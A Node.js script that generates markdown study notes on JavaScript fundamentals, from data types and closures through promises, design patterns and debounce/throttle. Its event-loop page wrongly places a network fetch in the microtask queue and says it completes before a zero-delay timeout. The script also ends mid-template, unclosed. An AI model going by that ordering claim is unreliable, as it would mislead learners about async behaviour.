const fs = require('fs');
const path = require('path');

function write(slug, content) {
  const filePath = path.join(__dirname, '..', 'content', 'javascript', `${slug}.md`);
  fs.mkdirSync(path.dirname(filePath), { recursive: true });
  fs.writeFileSync(filePath, content, 'utf8');
  console.log('wrote:', slug);
}

// ─── Ch1: Core Fundamentals ───────────────────────────────────────────────────

write('js-data-types', `---
title: "Data Types"
category: "javascript"
chapterId: "js-core-fundamentals"
slug: "js-data-types"
description: "Primitives vs reference types, typeof, and type coercion."
---

# Data Types

## What is it?

JavaScript has two categories of types: **primitive** (stored by value) and **reference** (stored by address in memory).

**Primitive types** — 7 total:
\`string\`, \`number\`, \`boolean\`, \`null\`, \`undefined\`, \`symbol\`, \`bigint\`

**Reference types**: \`object\`, \`array\`, \`function\` (all objects under the hood)

## When does it matter?

Primitives are copied when assigned. Reference types share the same memory address — mutating one variable affects all references pointing to it.

## How to use it

\`\`\`js
// Primitives — copied by value
let a = 10;
let b = a;
b = 20;
console.log(a); // 10 — unchanged

// Reference — shared by address
let obj1 = { name: 'Alice' };
let obj2 = obj1;
obj2.name = 'Bob';
console.log(obj1.name); // 'Bob' — both point to same object
\`\`\`

## typeof gotchas

\`\`\`js
typeof 'hello'     // 'string'
typeof 42          // 'number'
typeof true        // 'boolean'
typeof undefined   // 'undefined'
typeof null        // 'object' ← famous JS bug, not a real object
typeof []          // 'object' ← use Array.isArray() instead
typeof function(){} // 'function'
typeof Symbol()    // 'symbol'
typeof 9007199254740993n // 'bigint'
\`\`\`

## Type coercion

JS silently converts types in operations:

\`\`\`js
'5' + 1   // '51'  — number coerced to string (+ concatenates)
'5' - 1   // 4     — string coerced to number (- only does math)
true + 1  // 2     — true is 1
null + 1  // 1     — null is 0
[] + {}   // '[object Object]'
\`\`\`

> ⚠️ **Warning:** Always use \`===\` over \`==\` to avoid implicit coercion surprises.
`);

write('js-operators-coercion', `---
title: "Operators & Coercion"
category: "javascript"
chapterId: "js-core-fundamentals"
slug: "js-operators-coercion"
description: "== vs ===, implicit/explicit casting, and truthy/falsy."
---

# Operators & Coercion

## What is it?

**Coercion** is JS automatically converting one type to another during an operation. It happens with \`==\`, arithmetic, and conditional checks.

## \`==\` vs \`===\`

\`==\` (loose equality) coerces types before comparing. \`===\` (strict equality) never coerces — both value and type must match.

\`\`\`js
0 == false     // true  — false coerced to 0
0 === false    // false — different types

'' == false    // true
'' === false   // false

null == undefined  // true  — special case
null === undefined // false

1 == '1'   // true  — '1' coerced to 1
1 === '1'  // false
\`\`\`

## Falsy values

These are the only 8 values that evaluate to false in a boolean context:

\`\`\`js
false, 0, -0, 0n, '', null, undefined, NaN
\`\`\`

Everything else is truthy — including \`[]\`, \`{}\`, and \`'0'\`.

## Explicit conversion

\`\`\`js
Number('42')     // 42
Number('')       // 0
Number(null)     // 0
Number(undefined)// NaN
Number(true)     // 1

String(42)       // '42'
String(null)     // 'null'

Boolean(0)       // false
Boolean('hello') // true
Boolean([])      // true ← not false!
\`\`\`

## Logical operators

\`\`\`js
// || returns first truthy value (or last value)
'Alice' || 'default'  // 'Alice'
null || 'default'     // 'default'

// && returns first falsy value (or last value)
true && 'hello'  // 'hello'
null && 'hello'  // null

// ?? (nullish coalescing) — only falls back on null/undefined, not 0 or ''
0 ?? 'default'   // 0  ← treats 0 as valid!
null ?? 'default' // 'default'
\`\`\`

> ⚠️ **Warning:** Use \`??\` instead of \`||\` when you want to allow \`0\` or empty string as valid values.
`);

write('js-variable-declarations', `---
title: "Variable Declarations"
category: "javascript"
chapterId: "js-core-fundamentals"
slug: "js-variable-declarations"
description: "var, let, const — scope, hoisting, and redeclaration rules."
---

# Variable Declarations

## What is it?

Three keywords to declare variables, each with different scoping and hoisting rules.

| | \`var\` | \`let\` | \`const\` |
|---|---|---|---|
| Scope | Function | Block | Block |
| Hoisted | Yes (as \`undefined\`) | Yes (TDZ — unusable) | Yes (TDZ — unusable) |
| Re-declarable | Yes | No | No |
| Re-assignable | Yes | Yes | No |

## How to use it

\`\`\`js
// var — function-scoped, leaks out of blocks
if (true) {
  var x = 10;
}
console.log(x); // 10 — accessible outside the block!

// let — block-scoped
if (true) {
  let y = 10;
}
console.log(y); // ReferenceError

// const — block-scoped, must be initialized
const PI = 3.14;
PI = 3; // TypeError — cannot reassign

// const with objects — the reference is fixed, not the contents
const user = { name: 'Alice' };
user.name = 'Bob'; // ✅ allowed — object contents can change
user = {};         // ❌ TypeError — cannot reassign the reference
\`\`\`

## Hoisting behavior

\`\`\`js
console.log(a); // undefined — var is hoisted as undefined
var a = 5;

console.log(b); // ReferenceError — let is in TDZ
let b = 5;
\`\`\`

> ⚠️ **Warning:** Avoid \`var\` in modern code. Use \`const\` by default, \`let\` when you need to reassign.
`);

write('js-memory-references', `---
title: "Memory & References"
category: "javascript"
chapterId: "js-core-fundamentals"
slug: "js-memory-references"
description: "Pass by value vs pass by reference in memory allocation."
---

# Memory & References

## What is it?

**Stack** stores primitives — small, fixed-size values. **Heap** stores objects — dynamic, larger structures. This determines how variables behave when copied.

- **Pass by value**: a copy of the actual data is made (primitives)
- **Pass by reference**: a copy of the memory address is made (objects)

## How to use it

\`\`\`js
// Pass by value — primitives
function addTen(n) {
  n += 10;
}
let num = 5;
addTen(num);
console.log(num); // 5 — unchanged, function got a copy

// Pass by reference — objects
function rename(person) {
  person.name = 'Bob';
}
let user = { name: 'Alice' };
rename(user);
console.log(user.name); // 'Bob' — same object in memory

// Reassigning the parameter does NOT affect the original
function replace(person) {
  person = { name: 'Charlie' }; // creates a new local reference
}
replace(user);
console.log(user.name); // 'Bob' — original untouched
\`\`\`

## Comparing objects

\`\`\`js
const a = { x: 1 };
const b = { x: 1 };
const c = a;

a === b // false — different references in memory
a === c // true  — same reference
\`\`\`

> ⚠️ **Warning:** Mutating function arguments (objects/arrays) causes side effects that are hard to trace. Prefer returning new objects instead of modifying the input.
`);

// ─── Ch2: Scope, Closures ─────────────────────────────────────────────────────

write('js-hoisting', `---
title: "Hoisting"
category: "javascript"
chapterId: "js-scope-closures"
slug: "js-hoisting"
description: "Variable and function declaration elevation at compile phase."
---

# Hoisting

## What is it?

Before JS executes your code it does a compile pass and **moves declarations to the top of their scope**. Only the declaration is hoisted — not the initialization.

## How to use it

\`\`\`js
// Function declarations — fully hoisted
sayHi(); // 'Hi!' — works before the declaration
function sayHi() { console.log('Hi!'); }

// var — declaration hoisted, value is undefined
console.log(x); // undefined
var x = 5;
console.log(x); // 5

// let/const — declaration hoisted but NOT usable (TDZ)
console.log(y); // ReferenceError
let y = 5;

// Function expressions — NOT hoisted
greet(); // TypeError: greet is not a function
var greet = function() { console.log('Hello'); };
\`\`\`

## Function declarations vs expressions

\`\`\`js
// Declaration — hoisted completely
function add(a, b) { return a + b; }

// Expression — only var is hoisted
const multiply = (a, b) => a * b; // not hoisted
\`\`\`

> ⚠️ **Warning:** Relying on hoisting makes code unpredictable. Declare variables and functions before using them.
`);

write('js-scope-chain', `---
title: "Scope Chain"
category: "javascript"
chapterId: "js-scope-closures"
slug: "js-scope-chain"
description: "Global, function, and block scopes with lexical scoping."
---

# Scope Chain

## What is it?

**Scope** determines where a variable is accessible. **Lexical scoping** means scope is determined by where the code is written, not where it runs. When JS can't find a variable, it walks up the scope chain to parent scopes.

## Three scope types

\`\`\`js
// Global scope — accessible everywhere
const SITE_NAME = 'FED Notes';

function outer() {
  // Function scope — accessible inside outer and nested functions
  const x = 10;

  if (true) {
    // Block scope — accessible only inside this {}
    let y = 20;
    const z = 30;
    console.log(x); // 10 — walks up to function scope
    console.log(SITE_NAME); // walks up to global scope
  }

  console.log(y); // ReferenceError — y is block-scoped
}
\`\`\`

## Scope chain lookup

\`\`\`js
const a = 'global';

function outer() {
  const b = 'outer';

  function inner() {
    const c = 'inner';
    console.log(a); // found in global scope
    console.log(b); // found in outer scope
    console.log(c); // found in inner scope
  }
  inner();
}
\`\`\`

JS walks: inner → outer → global → ReferenceError.

> ⚠️ **Warning:** Global variables pollute the global scope and can be accidentally overwritten. Always use \`const\`/\`let\` inside functions or modules.
`);

write('js-closures', `---
title: "Closures"
category: "javascript"
chapterId: "js-scope-closures"
slug: "js-closures"
description: "Functions retaining access to their lexical scope."
---

# Closures

## What is it?

A closure is a function that **remembers the variables from its outer scope** even after that outer function has returned. The inner function carries a reference to the surrounding environment.

## When to use it?

- Data privacy / encapsulation
- Factory functions that generate configured functions
- Memoization, counters, event handlers that need persistent state

## How to use it

\`\`\`js
function makeCounter() {
  let count = 0; // private — not accessible from outside

  return {
    increment() { count++; },
    decrement() { count--; },
    value() { return count; },
  };
}

const counter = makeCounter();
counter.increment();
counter.increment();
console.log(counter.value()); // 2
console.log(count); // ReferenceError — count is private
\`\`\`

## Factory function example

\`\`\`js
function multiplier(factor) {
  return (number) => number * factor; // closes over factor
}

const double = multiplier(2);
const triple = multiplier(3);

double(5); // 10
triple(5); // 15
\`\`\`

## Classic loop bug

\`\`\`js
// ❌ Bug — all callbacks share the same i (var is function-scoped)
for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 100); // 3, 3, 3
}

// ✅ Fix — let creates a new binding each iteration
for (let i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 100); // 0, 1, 2
}
\`\`\`

> ⚠️ **Warning:** Closures holding large objects or DOM nodes prevent garbage collection. Clear references when the closure is no longer needed.
`);

write('js-tdz', `---
title: "Temporal Dead Zone (TDZ)"
category: "javascript"
chapterId: "js-scope-closures"
slug: "js-tdz"
description: "The TDZ window for let and const before initialization."
---

# Temporal Dead Zone (TDZ)

## What is it?

The TDZ is the window between the **start of the block scope** and the point where a \`let\` or \`const\` variable is initialized. Accessing the variable in this window throws a \`ReferenceError\`.

The variable is hoisted (JS knows it exists), but it's not yet initialized — so it's "dead."

## How to use it

\`\`\`js
{
  // TDZ begins for x here
  console.log(x); // ReferenceError: Cannot access 'x' before initialization
  let x = 10;     // TDZ ends here — x is initialized
  console.log(x); // 10
}
\`\`\`

## TDZ vs var hoisting

\`\`\`js
console.log(a); // undefined — var is hoisted and initialized to undefined
var a = 5;

console.log(b); // ReferenceError — let is in TDZ
let b = 5;
\`\`\`

## TDZ in functions

\`\`\`js
function example() {
  // TDZ for result starts here
  const compute = () => result * 2; // ← defines a closure, not called yet
  const result = 10;                // TDZ ends here
  return compute(); // 20 — called AFTER initialization, works fine
}
\`\`\`

> ⚠️ **Warning:** TDZ errors appear at runtime, not at parse time. Declare all \`let\`/\`const\` variables at the top of their scope to avoid them.
`);

// ─── Ch3: Functions & Objects ─────────────────────────────────────────────────

write('js-this-keyword', `---
title: "This Keyword"
category: "javascript"
chapterId: "js-functions-objects"
slug: "js-this-keyword"
description: "Dynamic binding in methods, arrow functions, and global scope."
---

# This Keyword

## What is it?

\`this\` refers to the **object that is currently executing the function**. It is determined at call time, not definition time (except for arrow functions).

## The 4 binding rules

\`\`\`js
// 1. Default binding — global object (or undefined in strict mode)
function greet() { console.log(this); }
greet(); // window (browser) | undefined (strict mode)

// 2. Implicit binding — the object before the dot
const user = {
  name: 'Alice',
  greet() { console.log(this.name); },
};
user.greet(); // 'Alice' — this = user

// 3. Explicit binding — call / apply / bind
function greet() { console.log(this.name); }
greet.call({ name: 'Bob' });  // 'Bob'
greet.apply({ name: 'Bob' }); // 'Bob'
const bound = greet.bind({ name: 'Carol' });
bound(); // 'Carol'

// 4. new binding — fresh object created
function Person(name) { this.name = name; }
const p = new Person('Dave');
p.name; // 'Dave'
\`\`\`

## Arrow functions — no own this

Arrow functions inherit \`this\` from the surrounding lexical scope. They never have their own.

\`\`\`js
const obj = {
  name: 'Alice',
  greetLater() {
    setTimeout(() => {
      console.log(this.name); // 'Alice' — arrow inherits from greetLater
    }, 100);
  },
  greetBroken() {
    setTimeout(function() {
      console.log(this.name); // undefined — regular function, this = window
    }, 100);
  },
};
\`\`\`

> ⚠️ **Warning:** Extracting a method from an object loses its \`this\` binding: \`const fn = obj.method; fn();\` — \`this\` is no longer \`obj\`. Use \`bind\` or an arrow wrapper.
`);

write('js-arrow-functions', `---
title: "Arrow Functions"
category: "javascript"
chapterId: "js-functions-objects"
slug: "js-arrow-functions"
description: "Syntax constraints, no this/arguments/super binding."
---

# Arrow Functions

## What is it?

Arrow functions (\`=>\`) are a shorter syntax for functions. They have no own \`this\`, \`arguments\`, \`super\`, or \`new.target\`. This makes them ideal as callbacks but unsuitable as methods or constructors.

## Syntax

\`\`\`js
// Traditional
function add(a, b) { return a + b; }

// Arrow — explicit return with body
const add = (a, b) => { return a + b; };

// Arrow — implicit return (no curly braces)
const add = (a, b) => a + b;

// Single param — no parens needed
const double = n => n * 2;

// No params
const greet = () => 'Hello!';

// Returning an object literal — wrap in parens
const makeUser = (name) => ({ name, role: 'user' });
\`\`\`

## What arrow functions cannot do

\`\`\`js
// ❌ Cannot use as a constructor
const Person = (name) => { this.name = name; };
new Person('Alice'); // TypeError: Person is not a constructor

// ❌ No arguments object
const fn = () => { console.log(arguments); }; // ReferenceError

// ✅ Use rest params instead
const fn = (...args) => { console.log(args); };

// ❌ Cannot be used as object methods (this is wrong)
const obj = {
  name: 'Alice',
  greet: () => console.log(this.name), // undefined — this = outer scope
};

// ✅ Use regular method syntax
const obj = {
  name: 'Alice',
  greet() { console.log(this.name); }, // 'Alice'
};
\`\`\`

> ⚠️ **Warning:** Never use arrow functions as object methods or event listener callbacks where you need \`this\` to refer to the object/element.
`);

write('js-explicit-binding', `---
title: "Explicit Binding"
category: "javascript"
chapterId: "js-functions-objects"
slug: "js-explicit-binding"
description: "call(), apply(), and bind() invocation patterns."
---

# Explicit Binding

## What is it?

Three methods on \`Function.prototype\` that let you **manually set what \`this\` refers to** when calling a function.

| Method | Calls immediately? | Args format |
|---|---|---|
| \`call(ctx, a, b)\` | Yes | Spread args |
| \`apply(ctx, [a, b])\` | Yes | Array of args |
| \`bind(ctx, a, b)\` | No — returns new fn | Spread args |

## How to use it

\`\`\`js
function introduce(greeting, punctuation) {
  console.log(\`\${greeting}, I'm \${this.name}\${punctuation}\`);
}

const person = { name: 'Alice' };

introduce.call(person, 'Hello', '!');   // "Hello, I'm Alice!"
introduce.apply(person, ['Hi', '.']);   // "Hi, I'm Alice."
const fn = introduce.bind(person, 'Hey'); // returns new function
fn('?'); // "Hey, I'm Alice?"
\`\`\`

## Real-world uses

\`\`\`js
// Borrowing array methods for array-like objects
const nodeList = document.querySelectorAll('div');
const arr = Array.prototype.slice.call(nodeList);

// Partial application with bind
function multiply(a, b) { return a * b; }
const double = multiply.bind(null, 2); // pre-fills a = 2
double(5); // 10

// Math.max on an array
const nums = [1, 9, 3, 7];
Math.max.apply(null, nums); // 9
// Modern equivalent:
Math.max(...nums); // 9
\`\`\`

> ⚠️ **Warning:** \`bind\` creates a new function every time it's called. In React, avoid calling \`bind\` inside \`render\` — do it in the constructor or use arrow functions instead.
`);

write('js-functional-programming', `---
title: "Functional Programming"
category: "javascript"
chapterId: "js-functions-objects"
slug: "js-functional-programming"
description: "HOFs, currying, pure functions, and IIFEs."
---

# Functional Programming

## What is it?

A programming style treating computation as the evaluation of **pure functions**, avoiding shared state and mutable data.

## Higher-Order Functions (HOF)

A function that takes a function as an argument or returns a function.

\`\`\`js
// Array HOFs
const nums = [1, 2, 3, 4, 5];

nums.map(n => n * 2);              // [2, 4, 6, 8, 10]
nums.filter(n => n % 2 === 0);     // [2, 4]
nums.reduce((acc, n) => acc + n, 0); // 15
\`\`\`

## Pure Functions

Same input → same output. No side effects.

\`\`\`js
// Pure — no external dependencies
function add(a, b) { return a + b; }

// Impure — depends on external state
let tax = 0.1;
function price(amount) { return amount + amount * tax; } // not pure
\`\`\`

## Currying

Transforming a function of multiple args into a chain of single-arg functions.

\`\`\`js
// Regular
const add = (a, b) => a + b;
add(2, 3); // 5

// Curried
const add = a => b => a + b;
add(2)(3);     // 5
const add2 = add(2);
add2(10); // 12 — partially applied
\`\`\`

## IIFE (Immediately Invoked Function Expression)

Runs immediately at definition. Used to create a private scope.

\`\`\`js
const result = (function() {
  const secret = 42; // private
  return secret * 2;
})();

console.log(result); // 84
console.log(secret); // ReferenceError
\`\`\`

> ⚠️ **Warning:** Avoid overusing currying — it reduces readability. Use it where partial application genuinely simplifies repeated calls.
`);

write('js-prototypes', `---
title: "Prototypes"
category: "javascript"
chapterId: "js-functions-objects"
slug: "js-prototypes"
description: "Prototype chain, __proto__, and prototypal inheritance."
---

# Prototypes

## What is it?

Every JavaScript object has an internal link to another object called its **prototype**. When you access a property, JS looks on the object first, then walks up the prototype chain until it finds it or hits \`null\`.

## How to use it

\`\`\`js
const animal = {
  breathe() { console.log('breathing'); }
};

const dog = Object.create(animal); // dog's prototype = animal
dog.bark = function() { console.log('woof'); };

dog.bark();    // 'woof'     — found on dog
dog.breathe(); // 'breathing' — found on animal (via prototype chain)
\`\`\`

## __proto__ and prototype

\`\`\`js
function Person(name) { this.name = name; }
Person.prototype.greet = function() { return \`Hi, I'm \${this.name}\`; };

const alice = new Person('Alice');
alice.greet(); // "Hi, I'm Alice"

alice.__proto__ === Person.prototype // true
\`\`\`

## Prototype chain

\`\`\`js
// alice → Person.prototype → Object.prototype → null
alice.toString(); // found on Object.prototype
alice.nonExistent; // undefined — reached null, not found
\`\`\`

## Class syntax (modern)

Classes are syntactic sugar over prototype-based inheritance:

\`\`\`js
class Animal {
  constructor(name) { this.name = name; }
  speak() { return \`\${this.name} makes a sound.\`; }
}

class Dog extends Animal {
  speak() { return \`\${this.name} barks.\`; }
}

const d = new Dog('Rex');
d.speak(); // 'Rex barks.'
d instanceof Dog;    // true
d instanceof Animal; // true
\`\`\`

> ⚠️ **Warning:** Avoid mutating \`Object.prototype\` — it affects all objects in the entire runtime.
`);

// ─── Ch4: Async ───────────────────────────────────────────────────────────────

write('js-event-loop', `---
title: "Event Loop"
category: "javascript"
chapterId: "js-async-runtime"
slug: "js-event-loop"
description: "Call Stack, Web APIs, Macrotask Queue, and Microtask Queue."
---

# Event Loop

## What is it?

JavaScript is **single-threaded** — it can only execute one thing at a time. The event loop is the mechanism that allows async operations (timers, fetch, I/O) to run without blocking the main thread.

## The components

| Component | Role |
|---|---|
| **Call Stack** | Executes sync code, LIFO (last in, first out) |
| **Web APIs** | Browser handles async ops (setTimeout, fetch) |
| **Macrotask Queue** | setTimeout, setInterval, I/O callbacks |
| **Microtask Queue** | Promise callbacks, \`queueMicrotask\` |

**Microtasks run before the next macrotask** — they drain completely after each task.

## How to use it

\`\`\`js
console.log('1 — sync');

setTimeout(() => console.log('4 — macrotask'), 0);

Promise.resolve().then(() => console.log('3 — microtask'));

console.log('2 — sync');

// Output: 1, 2, 3, 4
\`\`\`

## Step-by-step execution

\`\`\`js
console.log('start');

setTimeout(() => console.log('timeout'), 0);     // → Macrotask Queue

fetch('/api').then(r => r.json())                 // → Microtask Queue
             .then(() => console.log('fetch done'));

Promise.resolve().then(() => console.log('micro')); // → Microtask Queue

console.log('end');

// start → end → micro → fetch done → timeout
\`\`\`

> ⚠️ **Warning:** A long-running sync operation blocks the call stack — no events, clicks, or renders can happen. Break heavy work into chunks using \`setTimeout(fn, 0)\` or \`requestIdleCallback\`.
`);

write('js-promises', `---
title: "Promises"
category: "javascript"
chapterId: "js-async-runtime"
slug: "js-promises"
description: "States, chaining, and combinators — all, race, allSettled, any."
---

# Promises

## What is it?

A Promise is an object representing the eventual **completion or failure** of an async operation. It has three states: \`pending\`, \`fulfilled\`, \`rejected\`.

## How to use it

\`\`\`js
const fetchUser = (id) => new Promise((resolve, reject) => {
  if (id > 0) resolve({ id, name: 'Alice' });
  else reject(new Error('Invalid ID'));
});

fetchUser(1)
  .then(user => console.log(user.name))  // 'Alice'
  .catch(err => console.error(err))
  .finally(() => console.log('done'));   // always runs
\`\`\`

## Chaining

\`\`\`js
fetch('/api/users/1')
  .then(res => res.json())
  .then(user => fetch(\`/api/posts?userId=\${user.id}\`))
  .then(res => res.json())
  .then(posts => console.log(posts))
  .catch(err => console.error(err)); // catches any error in the chain
\`\`\`

## Combinators

\`\`\`js
const p1 = fetch('/api/a').then(r => r.json());
const p2 = fetch('/api/b').then(r => r.json());
const p3 = fetch('/api/c').then(r => r.json());

// all — waits for ALL. Rejects if any one rejects.
const [a, b, c] = await Promise.all([p1, p2, p3]);

// allSettled — waits for ALL regardless of failure
const results = await Promise.allSettled([p1, p2, p3]);
results.forEach(r => {
  if (r.status === 'fulfilled') console.log(r.value);
  else console.error(r.reason);
});

// race — resolves/rejects with the FIRST to settle
const fastest = await Promise.race([p1, p2, p3]);

// any — resolves with FIRST fulfillment, rejects only if ALL reject
const first = await Promise.any([p1, p2, p3]);
\`\`\`

| Combinator | Resolves when | Rejects when |
|---|---|---|
| \`all\` | All fulfill | Any rejects |
| \`allSettled\` | All settle (any result) | Never |
| \`race\` | First to settle | First to reject |
| \`any\` | First to fulfill | All reject |

> ⚠️ **Warning:** Always add \`.catch()\` or use try/catch with await — unhandled promise rejections crash Node and warn loudly in browsers.
`);

write('js-async-await', `---
title: "Async / Await"
category: "javascript"
chapterId: "js-async-runtime"
slug: "js-async-await"
description: "Sequential vs parallel execution and async error handling."
---

# Async / Await

## What is it?

\`async/await\` is syntactic sugar over Promises — it makes async code read like synchronous code. An \`async\` function always returns a Promise. \`await\` pauses execution inside that function until the Promise settles.

## How to use it

\`\`\`js
async function loadUser(id) {
  const res = await fetch(\`/api/users/\${id}\`);
  const user = await res.json();
  return user;
}
\`\`\`

## Error handling

\`\`\`js
async function loadUser(id) {
  try {
    const res = await fetch(\`/api/users/\${id}\`);
    if (!res.ok) throw new Error(\`HTTP \${res.status}\`);
    return await res.json();
  } catch (err) {
    console.error('Failed:', err.message);
    return null;
  }
}
\`\`\`

## Sequential vs Parallel

\`\`\`js
// Sequential — each await waits for the previous (slow: 300ms total)
const user = await fetchUser(1);     // 100ms
const posts = await fetchPosts(1);   // 200ms

// Parallel — both start immediately (fast: 200ms total)
const [user, posts] = await Promise.all([
  fetchUser(1),   // 100ms
  fetchPosts(1),  // 200ms — run concurrently
]);
\`\`\`

## Top-level await (ES2022)

\`\`\`js
// In ES Modules (type="module"), await can be used at the top level
const config = await fetch('/config.json').then(r => r.json());
\`\`\`

> ⚠️ **Warning:** Using \`await\` in a loop (\`for...of\`) runs iterations sequentially. If they are independent, use \`Promise.all(array.map(...))\` for parallel execution.
`);

// ─── Ch5: OOP & Patterns ─────────────────────────────────────────────────────

write('js-classes-oop', `---
title: "Classes & OOP"
category: "javascript"
chapterId: "js-oop-patterns"
slug: "js-classes-oop"
description: "Private fields, getters/setters, static methods, inheritance."
---

# Classes & OOP

## What is it?

ES6 classes are syntactic sugar over prototype-based inheritance. They provide a clean OOP syntax for creating objects with shared behavior.

## How to use it

\`\`\`js
class BankAccount {
  #balance = 0; // private field — inaccessible outside

  constructor(owner, initial = 0) {
    this.owner = owner;
    this.#balance = initial;
  }

  // Getter — access like a property
  get balance() { return this.#balance; }

  // Regular method
  deposit(amount) {
    if (amount <= 0) throw new Error('Amount must be positive');
    this.#balance += amount;
  }

  withdraw(amount) {
    if (amount > this.#balance) throw new Error('Insufficient funds');
    this.#balance -= amount;
  }

  // Static — called on the class, not an instance
  static currency() { return 'USD'; }
}

const acc = new BankAccount('Alice', 100);
acc.deposit(50);
console.log(acc.balance);        // 150
console.log(acc.#balance);       // SyntaxError — private!
console.log(BankAccount.currency()); // 'USD'
\`\`\`

## Inheritance

\`\`\`js
class SavingsAccount extends BankAccount {
  #interestRate;

  constructor(owner, initial, rate) {
    super(owner, initial); // must call before using this
    this.#interestRate = rate;
  }

  applyInterest() {
    this.deposit(this.balance * this.#interestRate);
  }
}

const savings = new SavingsAccount('Bob', 1000, 0.05);
savings.applyInterest();
console.log(savings.balance); // 1050
\`\`\`

> ⚠️ **Warning:** Private fields (\`#\`) are truly private — not even subclasses can access them. Use protected naming conventions (\`_field\`) if subclasses need access.
`);

write('js-modules', `---
title: "Modules"
category: "javascript"
chapterId: "js-oop-patterns"
slug: "js-modules"
description: "CommonJS (require) vs ES Modules (import/export) differences."
---

# Modules

## What is it?

Modules let you split code into reusable files with explicit imports and exports.

## CommonJS (CJS) — Node.js default

\`\`\`js
// math.js
function add(a, b) { return a + b; }
module.exports = { add };

// app.js
const { add } = require('./math');
console.log(add(2, 3)); // 5
\`\`\`

## ES Modules (ESM) — browser and modern Node.js

\`\`\`js
// math.js
export function add(a, b) { return a + b; }
export const PI = 3.14;
export default class Calculator {} // one default per file

// app.js
import Calculator, { add, PI } from './math.js';
import * as Math from './math.js'; // namespace import
\`\`\`

## Key differences

| | CommonJS | ES Modules |
|---|---|---|
| Syntax | \`require\` / \`module.exports\` | \`import\` / \`export\` |
| Loading | Dynamic, synchronous | Static, asynchronous |
| Tree-shaking | ❌ No | ✅ Yes |
| Top-level await | ❌ No | ✅ Yes |
| \`this\` at top level | \`module.exports\` | \`undefined\` |
| File extension | \`.js\` | \`.mjs\` or \`type: "module"\` |

## Dynamic import (lazy loading)

\`\`\`js
// Load a module on demand
const { add } = await import('./math.js');
\`\`\`

> ⚠️ **Warning:** You cannot use \`import\` inside a CommonJS file or \`require\` inside an ESM file. Pick one system per project — modern projects should use ESM.
`);

write('js-design-patterns', `---
title: "Design Patterns"
category: "javascript"
chapterId: "js-oop-patterns"
slug: "js-design-patterns"
description: "Module, Singleton, Factory, and Observer (Pub/Sub) patterns."
---

# Design Patterns

## Module Pattern

Encapsulate private state using closures. The original ES5 approach to private scope.

\`\`\`js
const CartModule = (() => {
  const items = []; // private

  return {
    add(item) { items.push(item); },
    remove(id) { items.splice(items.findIndex(i => i.id === id), 1); },
    getItems() { return [...items]; },
  };
})();

CartModule.add({ id: 1, name: 'Book' });
CartModule.getItems(); // [{ id: 1, name: 'Book' }]
\`\`\`

## Singleton Pattern

Ensure only one instance of an object exists.

\`\`\`js
class Config {
  static #instance = null;
  #settings = {};

  static getInstance() {
    if (!Config.#instance) Config.#instance = new Config();
    return Config.#instance;
  }

  set(key, val) { this.#settings[key] = val; }
  get(key) { return this.#settings[key]; }
}

const a = Config.getInstance();
const b = Config.getInstance();
a === b; // true — same instance
\`\`\`

## Factory Pattern

Create objects without specifying the exact class.

\`\`\`js
function createUser(type) {
  const base = { createdAt: new Date() };
  if (type === 'admin') return { ...base, role: 'admin', permissions: ['read', 'write', 'delete'] };
  if (type === 'guest') return { ...base, role: 'guest', permissions: ['read'] };
  return { ...base, role: 'user', permissions: ['read', 'write'] };
}

const admin = createUser('admin');
const guest = createUser('guest');
\`\`\`

## Observer (Pub/Sub) Pattern

Components communicate without direct references.

\`\`\`js
class EventEmitter {
  #listeners = {};

  on(event, cb) {
    (this.#listeners[event] ??= []).push(cb);
  }

  off(event, cb) {
    this.#listeners[event] = (this.#listeners[event] || []).filter(l => l !== cb);
  }

  emit(event, data) {
    (this.#listeners[event] || []).forEach(cb => cb(data));
  }
}

const emitter = new EventEmitter();
emitter.on('login', user => console.log(\`Welcome \${user.name}\`));
emitter.emit('login', { name: 'Alice' }); // 'Welcome Alice'
\`\`\`

> ⚠️ **Warning:** Singletons make testing hard because they share state across tests. Reset or mock them in test setups.
`);

// ─── Ch6: Memory, Performance ─────────────────────────────────────────────────

write('js-garbage-collection', `---
title: "Garbage Collection"
category: "javascript"
chapterId: "js-memory-performance"
slug: "js-garbage-collection"
description: "Mark-and-sweep, memory leaks, and profiling."
---

# Garbage Collection

## What is it?

JS automatically frees memory that is no longer reachable — this is **garbage collection**. The main algorithm is **mark-and-sweep**: the GC starts from the root (global object), marks all reachable objects, then sweeps (frees) everything unmarked.

## Common memory leaks

\`\`\`js
// 1. Forgotten timers — keeps callback + closure alive forever
const data = fetchLargeData();
setInterval(() => process(data), 1000);
// Fix: store the id and clearInterval when done

// 2. Detached DOM nodes — removed from DOM but still referenced in JS
let el = document.getElementById('modal');
document.body.removeChild(el);
// el still holds reference — not garbage collected
el = null; // Fix: explicitly clear the reference

// 3. Global variables — never GC'd
function leaky() {
  oops = 'this becomes global'; // forgot var/let/const
}

// 4. Closures holding large data
function process() {
  const hugeArray = new Array(1e6).fill('data');
  return () => hugeArray[0]; // entire array stays in memory
}
\`\`\`

## WeakMap / WeakSet for GC-friendly caches

\`\`\`js
const cache = new WeakMap();

function process(element) {
  if (cache.has(element)) return cache.get(element);
  const result = heavyComputation(element);
  cache.set(element, result); // GC'd when element is removed from DOM
  return result;
}
\`\`\`

## Profiling in Chrome DevTools

1. Open DevTools → **Memory** tab
2. Take a **Heap Snapshot**
3. Perform the action you suspect leaks
4. Take another snapshot
5. Compare — look for objects that grew unexpectedly

> ⚠️ **Warning:** \`WeakMap\` / \`WeakSet\` keys must be objects. They allow GC to collect entries when no other reference to the key exists.
`);

write('js-debounce-throttle', `---
title: "Debounce & Throttle"
category: "javascript"
chapterId: "js-memory-performance"
slug: "js-debounce-throttle"
description: "High-performance utilities for high-frequency events."
---

# Debounce & Throttle

## What is it?

Both limit how often a function runs. The difference is **when** the execution happens.

- **Debounce** — waits until the event stops for N ms, then fires once (good for search input)
- **Throttle** — fires at most once every N ms while events keep coming (good for scroll, resize)

## Debounce

\`\`\`js
function debounce(fn, delay) {
  let timer;
  return function(...args) {
    clearTimeout(timer);
    timer = setTimeout(() => fn.apply(this, args), delay);
  };
}

const onSearch = debounce((query) => {
  fetch(\`/api/search?q=\${query}\`);
}, 300);

input.addEventListener('input', e => onSearch(e.target.value));
// API called only 300ms after user stops typing
\`\`\`

## Throttle

\`\`\`js
function throttle(fn, limit) {
  let lastCall = 0;
  return function(...args) {
    const now = Date.now();
    if (now - lastCall >= limit) {
      lastCall = now;
      return fn.apply(this, args);
    }
  };
}

const onScroll = throttle(() => {
  updateNavbar(window.scrollY);
}, 100);

window.addEventListener('scroll', onScroll);
